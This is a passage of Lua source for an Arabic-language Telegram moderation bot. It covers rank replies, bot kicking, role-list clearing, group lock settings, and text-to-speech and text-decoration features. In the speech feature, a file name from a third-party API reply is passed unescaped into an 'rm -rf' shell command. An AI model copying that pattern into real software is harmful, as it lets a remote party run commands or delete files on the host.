Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙صلاحيات البوت هي ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙حذف الرسائل ↫ '..DEL..'\n᥀︙دعوة المستخدمين ↫ '..INV..'\n᥀︙حظر المستخدمين ↫ '..BAN..'\n᥀︙تثبيت الرسائل ↫ '..PIN..'\n᥀︙تغيير المعلومات ↫ '..EDT..'\n᥀︙اضافة مشرفين ↫ '..VIP..'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المطور (.*)$") 
DevaMeR:set(LanZo.."aMeR:SudoBot:Rd"..msg.chat_id_,Text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
DevaMeR:set(LanZo.."aMeR:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevaMeR:set(LanZo.."aMeR:Constructor:Rd"..msg.chat_id_,Text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المدير (.*)$") 
DevaMeR:set(LanZo.."aMeR:Managers:Rd"..msg.chat_id_,Text) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevaMeR:set(LanZo.."aMeR:Admins:Rd"..msg.chat_id_,Text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المميز (.*)$") 
DevaMeR:set(LanZo.."aMeR:VipMem:Rd"..msg.chat_id_,Text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المنظف (.*)$") 
DevaMeR:set(LanZo.."aMeR:Cleaner:Rd"..msg.chat_id_,Text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد العضو (.*)$") 
DevaMeR:set(LanZo.."aMeR:mem:Rd"..msg.chat_id_,Text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف جميع ردود الرتب", 1, 'md')
DevaMeR:del(LanZo.."aMeR:mem:Rd"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:Cleaner:Rd"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:VipMem:Rd"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:Admins:Rd"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:Managers:Rd"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:Constructor:Rd"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:BasicConstructor:Rd"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source LanZo     --
if text == "كشف البوتات" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = '᥀︙*قائمة البوتات* ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙*عدد البوتات هنا* ↫ '..n..'\n'
local f = '᥀︙*عدد البوتات المرفوعه* ↫ '..t..'\n᥀︙*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Dev_aMeR(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(LanZo) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*لاتوجد بوتات هنا*", 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙*عدد البوتات هنا* ↫ "..c.."\n᥀︙*عدد البوتات المرفوعه* ↫ "..x.."\n᥀︙*تم طرد* ↫ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
--     Source LanZo     --
end
--     Source LanZo     --
if Admin(msg) then
if text and text:match("^حذف (.*)$") or text and text:match("^مسح (.*)$") and ChCheck(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then
if txts[2] == 'الاساسيين' or txtss[2] == 'الاساسيين' or txts[2] == 'المطورين الاساسيين' or txtss[2] == 'المطورين الاساسيين' then
DevaMeR:del(LanZo..'aMeR:aMeRSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المطورين الاساسيين")  
end
end
if aMeRSudo(msg) then
if txts[2] == 'الثانويين' or txtss[2] == 'الثانويين' or txts[2] == 'المطورين الثانويين' or txtss[2] == 'المطورين الثانويين' then
DevaMeR:del(LanZo..'aMeR:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المطورين الثانويين")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevaMeR:del(LanZo..'aMeR:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المطورين")  
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevaMeR:del(LanZo..'aMeR:BanAll:')
DevaMeR:del(LanZo..'aMeR:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة العام")  
end
end
if SudoBot(msg) then
if txts[2] == 'المالكين' or txtss[2] == 'المالكين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المالكين")  
DevaMeR:del(LanZo..'aMeR:Owner:'..msg.chat_id_)
end
end
if Owner(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المنشئين الاساسيين")  
DevaMeR:del(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المنشئين")  
DevaMeR:del(LanZo..'aMeR:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المدراء")  
DevaMeR:del(LanZo..'aMeR:Managers:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المنظفين")  
DevaMeR:del(LanZo..'aMeR:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الادمنيه")  
DevaMeR:del(LanZo..'aMeR:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف القوانين")  
DevaMeR:del(LanZo..'aMeR:rules'..msg.chat_id_)
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المطايه")  
DevaMeR:del(LanZo..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف رابط المجموعه")  
DevaMeR:del(LanZo.."aMeR:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المميزين")  
DevaMeR:del(LanZo..'aMeR:VipMem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevaMeR:del(LanZo..'aMeR:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المكتومين")  
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local List = DevaMeR:smembers(LanZo..'aMeR:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المقيدين")  
end
if aMeRConstructor(msg) then
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة المنع")  
DevaMeR:del(LanZo..'aMeR:Filters:'..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Filters:'..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:FilterAnimation"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:FilterPhoto"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قوائم المنع")  
DevaMeR:del(LanZo..'aMeR:Filters:'..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:FilterAnimation"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:FilterPhoto"..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
DevaMeR:del(LanZo.."aMeR:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة منع المتحركات")  
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
DevaMeR:del(LanZo.."aMeR:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة منع الصور")  
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
DevaMeR:del(LanZo.."aMeR:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف قائمة منع الملصقات")  
end
end
end
end
--     Source LanZo     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمنشئ الاساسي فقط', 1, 'md')
else
DevaMeR:del(LanZo..'aMeR:Ban:'..msg.chat_id_) DevaMeR:del(LanZo..'aMeR:Admins:'..msg.chat_id_) DevaMeR:del(LanZo..'User:Donky:'..msg.chat_id_) DevaMeR:del(LanZo..'aMeR:VipMem:'..msg.chat_id_) DevaMeR:del(LanZo..'aMeR:Filters:'..msg.chat_id_) DevaMeR:del(LanZo..'aMeR:Muted:'..msg.chat_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
--     Source LanZo     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not aMeRConstructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمالكين فقط', 1, 'md')
else
local basicconstructor = DevaMeR:smembers(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_)
local constructor = DevaMeR:smembers(LanZo..'aMeR:Constructor:'..msg.chat_id_)
local Managers = DevaMeR:smembers(LanZo..'aMeR:Managers:'..msg.chat_id_)
local admins = DevaMeR:smembers(LanZo..'aMeR:Admins:'..msg.chat_id_)
local vipmem = DevaMeR:smembers(LanZo..'aMeR:VipMem:'..msg.chat_id_)
local donky = DevaMeR:smembers(LanZo..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevaMeR:del(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Constructor:'..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Managers:'..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:Admins:'..msg.chat_id_)
DevaMeR:del(LanZo..'aMeR:VipMem:'..msg.chat_id_)
DevaMeR:del(LanZo..'User:Donky:'..msg.chat_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف جميع الرتب التاليه ↫ ❨ "..basicconstructort..constructort..Managerst..adminst..vipmemt..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     Source LanZo     --
if Admin(msg) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevaMeR:get(LanZo..'aMeR:Spam:Text'..msg.chat_id_)
end
--     Source LanZo     --
if DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source LanZo     --
if DevaMeR:get(LanZo.."aMeR:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevaMeR:get(LanZo.."aMeR:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevaMeR:get(LanZo.."aMeR:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source LanZo     --
if DevaMeR:get(LanZo..'aMeR:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevaMeR:get(LanZo..'aMeR:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevaMeR:get(LanZo.."aMeR:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevaMeR:get(LanZo..'aMeR:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevaMeR:get(LanZo..'aMeR:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevaMeR:get(LanZo..'aMeR:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevaMeR:get(LanZo..'aMeR:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevaMeR:hget(LanZo.."aMeR:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source LanZo     --
local TXTE = "᥀︙اعدادات المجموعه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
.."᥀︙الروابط ↫ "..mute_links.."\n"
.."᥀︙المعرف ↫ "..lock_tag.."\n"
.."᥀︙البوتات ↫ "..lock_bots.."\n"
.."᥀︙المتحركه ↫ "..mute_gifs.."\n"
.."᥀︙الملصقات ↫ "..lock_sticker.."\n"
.."᥀︙الملفات ↫ "..lock_file.."\n"
.."᥀︙الصور ↫ "..mute_photo.."\n"
.."᥀︙الفيديو ↫ "..mute_video.."\n"
.."᥀︙الاونلاين ↫ "..mute_in.."\n"
.."᥀︙الدردشه ↫ "..mute_text.."\n"
.."᥀︙التوجيه ↫ "..lock_forward.."\n"
.."᥀︙الاغاني ↫ "..mute_music.."\n"
.."᥀︙الصوت ↫ "..mute_voice.."\n"
.."᥀︙الجهات ↫ "..lock_contact.."\n"
.."᥀︙الماركداون ↫ "..markdown.."\n"
.."᥀︙الهاشتاك ↫ "..lock_htag.."\n"
.."᥀︙التعديل ↫ "..mute_edit.."\n"
.."᥀︙التثبيت ↫ "..lock_pin.."\n"
.."᥀︙الاشعارات ↫ "..lock_tgservice.."\n"
.."᥀︙الكلايش ↫ "..lock_spam.."\n"
.."᥀︙الدخول ↫ "..lock_Join.."\n"
.."᥀︙الشبكات ↫ "..lock_wp.."\n"
.."᥀︙المواقع ↫ "..lock_location.."\n"
.."᥀︙الفشار ↫ "..lock_fshar.."\n"
.."᥀︙الكفر ↫ "..lock_kaf.."\n"
.."᥀︙الطائفيه ↫ "..lock_taf.."\n"
.."᥀︙العربيه ↫ "..lock_arabic.."\n"
.."᥀︙الانكليزيه ↫ "..lock_english.."\n"
.."᥀︙الفارسيه ↫ "..lock_farsi.."\n"
.."᥀︙التكرار ↫ "..flood.."\n"
.."᥀︙عدد التكرار ↫ "..Flood_Num.."\n"
.."᥀︙عدد السبام ↫ "..spam_c.."\n"
.."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙[Source Channel](https://t.me/Bw5Bw)\n"
Dev_aMeR(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source LanZo     --
if text and text:match("^كول (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_aMeR(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if text == "تفعيل انطق" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل ميزة انطق'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Antk:aMeR'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل ميزة انطق'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Antk:aMeR'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevaMeR:get(LanZo..'aMeR:Antk:aMeR'..msg.chat_id_) and ChCheck(msg) then
local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^انطق (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..Antk.result.translate..'.mp3')  
os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
end
end
--     Source LanZo     --
if DevaMeR:get(LanZo..'aMeR:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevaMeR:del(LanZo..'aMeR:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevaMeR:del(LanZo..'aMeR:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:rules'..msg.chat_id_,text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي القوانين الان', 1, 'md')
DevaMeR:set(LanZo..'aMeR:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevaMeR:get(LanZo..'aMeR:rules'..msg.chat_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source LanZo     --
if text == 'رقمي' and ChCheck(msg) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "᥀︙رقمك ↫ +"..result.phone_number_
else
MyNumber = "᥀︙رقمك موضوع لجهات اتصالك فقط"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end
--     Source LanZo     --
if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الزخرفه بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Zrf:aMeR'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الزخرفه بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Zrf:aMeR'..msg.chat_id_,true)  
end
if DevaMeR:get(LanZo..'Zrf:aMeR'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الزخرفه', 1, 'md')
DevaMeR:del(LanZo..'Zrf:aMeR'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "᥀︙قائمة الزخرفه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevaMeR:del(LanZo..'Zrf:aMeR'..msg.chat_id_..msg.sender_user_id_)
return false   
end
if not DevaMeR:get(LanZo..'aMeR:Zrf:aMeR'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevaMeR:setex(LanZo.."Zrf:aMeR"..msg.chat_id_..msg.sender_user_id_,300,true)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
if not DevaMeR:get(LanZo..'aMeR:Zrf:aMeR'..msg.chat_id_) then
